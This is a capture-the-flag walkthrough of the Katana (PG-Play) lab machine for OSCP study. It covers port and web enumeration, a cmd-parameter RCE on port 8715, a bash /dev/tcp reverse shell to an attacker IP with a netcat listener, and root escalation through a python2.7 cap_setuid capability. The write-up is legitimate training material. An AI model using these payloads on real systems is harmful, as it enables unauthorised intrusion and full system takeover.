This walkthrough for the **Katana (PG-Play)** machine provides a comprehensive methodology for an OSCP-style examination, focusing on thorough enumeration, web application exploitation, reverse shell setup, and privilege escalation using extended file capabilities.

-----

## 📝 Comprehensive OSCP Walkthrough Notes: Katana (PG-Play)

The machine was compromised by exploiting a Remote Code Execution (RCE) vulnerability on a non-standard port, followed by leveraging an extended file capability (`cap_setuid+ep`) on the `python2.7` binary for full root access.

### 1\. Enumeration and Initial Recon

The initial reconnaissance phase focused on a full port scan to identify all available services, leading to the discovery of multiple web application entry points.

| Topic | Note | Timestamp |
| :--- | :--- | :--- |
| **Target OS** | **Debian** | [[33:49](http://www.youtube.com/watch?v=sY_d1r0Losw&t=2029)] |
| **Open Ports** | 21 (FTP), 22 (SSH), **80, 7080, 8088, 8715** (Multiple HTTP services) | [[33:12](http://www.youtube.com/watch?v=sY_d1r0Losw&t=1992)] |
| **FTP Check** | Attempted anonymous login (`anonymous`/`anonymous`) but failed. | [[40:05](http://www.youtube.com/watch?v=sY_d1r0Losw&t=2405)] |
| **Web Enumeration**| Directories and files were fuzzed across all HTTP ports to identify hidden paths. | [[40:49](http://www.youtube.com/watch?v=sY_d1r0Losw&t=2449)] |

#### 🔑 Key Commands for Recon

  * **Full Port Scan:** `nmap -p- -sV -sT $IP --open` [[30:36](http://www.youtube.com/watch?v=sY_d1r0Losw&t=1836)]
      * *Note: Using `-sT` (TCP connect scan) and `--open` helps capture a wide range of ports and focus the output.*
  * **Web Fuzzing (Example):** `wfuzz -c -z file,optional/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 http://$IP/FUZZ` [[41:28](http://www.youtube.com/watch?v=sY_d1r0Losw&t=2488)]

-----

### 2\. Gaining a Foothold (RCE via Port 8715)

Initial web checks on Port 80 (CSE Bookstore) revealed a rabbit hole with a SQL Injection vulnerability (exploited via `sqlmap`) and an admin login bypass that did not yield valuable system credentials. The key vulnerability was found on a non-standard port.

| Topic | Note | Timestamp |
| :--- | :--- | :--- |
| **Vulnerable Endpoint**| Port **8715** hosts an application that uses a URL parameter for command execution, likely implementing a function like `passthru($_GET['cmd'])`. | [[01:10:15](http://www.youtube.com/watch?v=sY_d1r0Losw&t=4215)] |
| **RCE Payload** | A simple command confirms the vulnerability: `http://<IP>:8715/katana/offsec.php?cmd=id` | [[01:10:15](http://www.youtube.com/watch?v=sY_d1r0Losw&t=4215)] |

#### 🌐 Reverse Shell & Shell Stabilization

To establish a stable connection, a Bash reverse shell was created, but it had to be carefully **URL-encoded** to prevent the ampersands (`&`) from being parsed as URL delimiters.

| Step | Command/Action | Timestamp |
| :--- | :--- | :--- |
| **1. Listener** | `nc -lnvp 9090` | [[01:15:53](http://www.youtube.com/watch?v=sY_d1r0Losw&t=4553)] |
| **2. Shell Payload**| **Unencoded Bash:** `bash -i >& /dev/tcp/<Attacker IP>/9090 0>&1` | [[01:15:20](http://www.youtube.com/watch?v=sY_d1r0Losw&t=4520)] |
| **3. Normalize** | The payload is wrapped with `bash -c` and **URL-encoded** before being sent in the `cmd` parameter. | [[01:18:23](http://www.youtube.com/watch?v=sY_d1r0Losw&t=4703)] |
| **4. TTY Breakout**| After catching the shell (as `www-data`), use **Ctrl+Z** to background it, then run: `stty raw -echo; fg` to restore TTY functionality and prevent the shell from breaking. | [[01:22:56](http://www.youtube.com/watch?v=sY_d1r0Losw&t=4976)] |
| **5. Environment**| `export TERM=xterm-256color` and `export PATH` to enable commands like `clear` and color output. | [[01:21:07](http://www.youtube.com/watch?v=sY_d1r0Losw&t=4867)] |

-----

### 3\. Privilege Escalation (Python setuid)

Privilege escalation was achieved not by exploiting a kernel bug or a bad `sudo` configuration, but by discovering an **extended file capability** configured on a system binary.

| Step | Note | Timestamp |
| :--- | :--- | :--- |
| **Initial Check** | Initial checks like `sudo -l` and checking world-writable directories came up empty. | [[01:24:02](http://www.youtube.com/watch?v=sY_d1r0Losw&t=5042)] |
| **Search Capabilities**| The tool used to scan the entire filesystem for capabilities: `getcap -r / 2>/dev/null` | [[01:40:37](http://www.youtube.com/watch?v=sY_d1r0Losw&t=6037)] |
| **Vulnerability Found**| The binary `/usr/bin/python2.7` has the **`cap_setuid+ep`** capability, allowing it to arbitrarily set its effective User ID (UID). | [[01:41:29](http://www.youtube.com/watch?v=sY_d1r0Losw&t=6089)] |
| **Exploit Code** | Create a simple Python script to set the UID to `0` (root) and spawn a new shell. | [[01:47:25](http://www.youtube.com/watch?v=sY_d1r0Losw&t=6445)] |

#### 🐍 Python Exploit Commands

The following script, saved as `offsec.py`, was executed:

```python
import os
os.setuid(0)
os.system('/bin/bash')
```

  * **Execute Exploit:** `python2.7 offsec.py` [[01:48:25](http://www.youtube.com/watch?v=sY_d1r0Losw&t=6505)]
  * **Root Confirmation:** The shell session showed `uid=0(root)`.
  * **Final Proof:** `cat /root/proof.txt` [[01:49:16](http://www.youtube.com/watch?v=sY_d1r0Losw&t=6556)]

### Takeaways for OSCP

  * **Exhaustive Enumeration:** The most critical step was checking all four web ports (80, 7080, 8088, 8715), as the RCE was on a non-standard port (8715).
  * **Extended Capabilities:** Always check for extended file capabilities (`getcap -r / 2>/dev/null`) during privilege escalation; they are a common, but often overlooked, escalation vector.
  * **Payload Normalization:** Pay close attention to how payloads are interpreted by the target server. Reverse shells in URLs usually require **URL-encoding** and the use of a command wrapper like `bash -c`.

http://googleusercontent.com/youtube_content/0